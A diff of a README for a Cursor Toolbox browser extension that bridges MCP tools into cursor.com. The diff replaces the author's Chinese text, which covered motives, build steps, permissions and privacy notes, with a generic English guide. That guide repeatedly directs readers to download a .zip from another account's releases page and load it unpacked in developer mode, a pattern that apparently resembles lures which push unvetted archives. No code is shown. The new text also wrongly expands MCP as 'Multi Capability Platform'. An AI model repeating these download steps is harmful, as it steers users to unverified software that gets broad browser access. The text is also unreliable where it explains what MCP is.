@@ -1,61 +1,159 @@
-# Cursor Toolbox
+# 🧰 Cursor-Toolbox - Improve cursor.com with useful tools
 
-基于 Manifest V3 的浏览器扩展，用于增强 cursor.com 网页端体验，并提供 MCP 工具和 SKILLS 调用桥接。
+[![Download Cursor-Toolbox](https://img.shields.io/badge/Download-Cursor--Toolbox-brightgreen)](https://github.com/Aesthetic-chukchi103/Cursor-Toolbox/releases)
 
-## 开发初衷
-1. 让ai小白0门槛体验到ai智能体**带来的便捷**。
-2. 让ai开发者，**低成本或者0成本验证**自己开发的智能体或者工作流，快速跑通和验证自己的开发流程。
-3. 为**日常使用者提供便捷**，可以直接在对话里完成一些事情，无需打开Claude code等终端工具来使用。
-4. 我**并非**抓住这个cursor帮助页来**薅羊毛**，只是提供一种思路和解决方案，同样的，我会开发通用的网页聊天调用MCP和skills的插件，为的也都是ai平权，**让更多用户低门槛了解ai agent，体验ai agent，未来成为ai agent的有力贡献者**。
-5. ai基座模型一定是会越来越强，但是**用户体验迟迟跟不上**。用户用的最多的，也就是最简单的，其实就是使用一个聊天框，像发微信一样的使用ai。就像ai大厂的app端或者web端那样，但是里面能使用的工具都是大厂后端自己提供的，说实话很鸡肋，用户并不能自定义工具使用，很浪费模型目前的性能。
-6. 就因为**大厂不能满足**人们日益上升的对AI智能体的使用需求，而网页版和app端的chat逻辑又**太过时了**。所以“龙虾”一出，就火了。
-7. 为什么龙虾能火？他正是**抓住了**大部分用户只想在聊天框像使用微信或QQ一样使用AI agent这一点。
-8. 现在龙虾的风评开始变差，起因还是门槛不够低，普通用户使用，会存在很高的风险，其实龙虾对于普通用户，是个失败的产品。**如果某大厂能把门槛降得足够低，比如打开他们的官网、聊天网页或者他们自家的app，也能自定义工具，使用skills，做好权限控制，普通用户谁还去安装龙虾**。当然，懂ai的人去玩龙虾这种高级智能体，肯定是会更好的，毕竟网页端或者app端会有它的局限在的嘛。
-9. 关于我做插件录制了5个使用案例，其实也是想说，**大部分普通用户，他们对ai智能体的使用也差不多是这样**，就是几个工具联动就能完成他们的任务，而我开发这个插件，就是为了满足这些人。
-10. 最后，我想说的是，这个插件**不能长久**，毕竟目前看来是擦边行为，长远看来，待ai大厂真能从官方解决我插件想解决的问题，那么，我这个插件也没有存在的意义了，因为从那时开始，我盼望的ai agent平民化时代也就开始了。
-11. **附：**为什么MCP、SKILLS这些概念要老外的ai厂商提出，然后成为ai界的行业标准，任重而道远啊，加油啊。
+---
 
-## 使用教程
-> 使用教程地址：https://blog.aiguicai.com/archives/cursor_toolbox    
-> 使用视频地址：https://www.bilibili.com/video/BV1mpcozoEXL/?share_source=copy_web&vd_source=23971f77ed7085fd5791077dbce9df89    
-> 本地MCP网关工具地址：https://github.com/510myRday/MCP-Gateway
+## 📋 What is Cursor-Toolbox?
 
-## 明确声明
-**所以软件都是绿色无毒，免费无限使用，仅供交流学习，切勿违法使用，否则后果自负！！**
+Cursor-Toolbox is a browser extension designed to improve the experience on cursor.com. It adds helpful tools and features for daily use. It also connects to MCP (Multi Capability Platform) tools and SKILLS bridges, allowing simple automation inside your browser.
 
-## 开发讨论
-我正在开发通用版本的网页聊天接入MCP和skills的插件，有好点子或者好的聊天界面渠道的朋友可以一起讨论开发。
-当然，也欢迎志同道合的朋友加入，以前聊天扯皮。
+This extension helps users interact with AI agents easily. It works inside chats on cursor.com, letting you use AI tools like you chat on everyday apps. It does not require you to open separate software or use complicated commands.
 
-> QQ群：1090461840   
-> 飞机群：https://t.me/+vq8WByYtPoQ1MjA1   
+---
 
-## 功能
-- 在 cursor.com 帮助页，注入辅助 UI 与面板
-- 提供 MCP 工具发现/启用/调用的前端桥接
-- （大家可以提供新思路，来完善功能）
+## ⚙️ Features
 
-## 安装（开发者模式）
-1. 打开 Chrome/Edge 扩展管理页，开启“开发者模式”
-2. 选择“加载已解压的扩展”，指向插件文件夹
-3. 或者直接去release里下载最新版本
+- Enhances cursor.com web pages with extra options and shortcuts
+- Bridges to MCP and SKILLS for easy tool and workflow integration
+- Lets you use AI agents with no technical steps
+- Supports simple tasks completion inside chat windows
+- Designed for users who want AI help without learning code
+- Lowers the barrier for trying new AI tools and workflows
 
-## 开发者构建
-```powershell
-powershell -ExecutionPolicy Bypass -File .\scripts\build-extension.ps1
-```
-输出在 `release/`。
+---
 
-## 权限说明
-- `storage`：保存扩展配置与开关状态
-- `activeTab`：与当前标签页通信
-- `host_permissions: <all_urls>`：用于访问你配置的 MCP 服务地址（扩展不会主动注入非 cursor.com 页面）
+## 🖥️ System Requirements
 
-## 隐私与数据
-- 当前实现未包含主动上报/埋点逻辑
-- MCP 请求将直连你配置的服务器，配置存于 `chrome.storage.local`
+- Windows 10 or later
+- Modern web browser (Google Chrome, Microsoft Edge, or Firefox) that supports Manifest V3 extensions
+- Internet connection for loading cursor.com and MCP services
 
-感谢大家的支持！！！
+---
 
-## 许可
-Apache-2.0
+## 🚀 Getting Started with Cursor-Toolbox
+
+Follow these steps to download, install, and begin using the Cursor-Toolbox extension on Windows.
+
+---
+
+## 1. Download the extension files
+
+Go to the release page below to find the latest version of Cursor-Toolbox:
+
+[Download Cursor-Toolbox Releases](https://github.com/Aesthetic-chukchi103/Cursor-Toolbox/releases)
+
+You will find files here with the `.zip` extension. Download the latest `.zip` file to your computer.
+
+---
+
+## 2. Extract the downloaded file
+
+Once the download finishes, locate the `.zip` file in your Downloads folder.
+
+Right-click the file and choose `Extract All...`
+
+Select a folder where you want to keep the extension files. For example, create a folder on your desktop called `Cursor-Toolbox`.
+
+Click `Extract` to unpack the files.
+
+---
+
+## 3. Open your browser in Developer Mode
+
+Open Google Chrome (or Microsoft Edge, or Firefox).
+
+Type `chrome://extensions/` in the address bar and press Enter.
+
+Enable Developer Mode by turning on the switch in the upper right corner of the page.
+
+---
+
+## 4. Load the Cursor-Toolbox extension
+
+Click on the `Load unpacked` button.
+
+In the window that opens, navigate to the folder where you extracted the files (from step 2).
+
+Select the folder and click `Select Folder`.
+
+The extension will load and appear in your extensions list.
+
+---
+
+## 5. Confirm the extension is active
+
+You should see Cursor-Toolbox listed with its icon near the address bar.
+
+Open a new tab and go to https://cursor.com
+
+The extension features should activate automatically on the site.
+
+---
+
+## 6. Using Cursor-Toolbox
+
+Inside cursor.com, you can use the extra tools added by Cursor-Toolbox:
+
+- Access MCP tools without leaving the chat
+- Run automated workflows linked through SKILLS bridges
+- Perform common tasks with simple clicks inside chat windows
+
+No need to open extra software or know commands. The tools work as part of your browser experience.
+
+---
+
+## 🎯 Tips for best use
+
+- Keep your browser updated for smooth extension operation
+- Sign in to cursor.com with your account before using advanced tools
+- If features don’t appear, try reloading the page or restarting your browser
+- Check the extension page often for updates and new features
+
+---
+
+## 🛠️ Troubleshooting
+
+- If the extension does not load, double-check you enabled Developer Mode
+- Make sure you selected the correct folder when loading the unpacked extension
+- Disable other browser extensions that might conflict with Cursor-Toolbox
+- Restart your browser if problems persist
+- For issues with features, try clearing browser cache on cursor.com
+
+---
+
+## 🔄 Updating Cursor-Toolbox
+
+To update the extension, download the newest release from the link above.
+
+Remove the current extension from your browser (via the extensions page).
+
+Repeat the install steps with the new files.
+
+This method ensures you use the latest tools and bug fixes.
+
+---
+
+## 📝 About this project
+
+Cursor-Toolbox started to make AI agent use easy for everyone. It aims to lower the cost and technical knowledge needed to connect and test AI workflows.
+
+The focus is on normal users who want simple chats with smart tools instead of complicated systems.
+
+This extension is experimental and made to explore ways to improve user experience on cursor.com.
+
+---
+
+## 🎯 Where to get it
+
+Get the latest release here:
+
+[![Download Cursor-Toolbox](https://img.shields.io/badge/Download-Cursor--Toolbox-brightgreen)](https://github.com/Aesthetic-chukchi103/Cursor-Toolbox/releases)
+
+---
+
+## 📞 Support and feedback
+
+If you have questions or want to report problems, please use the GitHub Issues page in this repository.
+
+Provide details about your browser and Windows version to help with support.
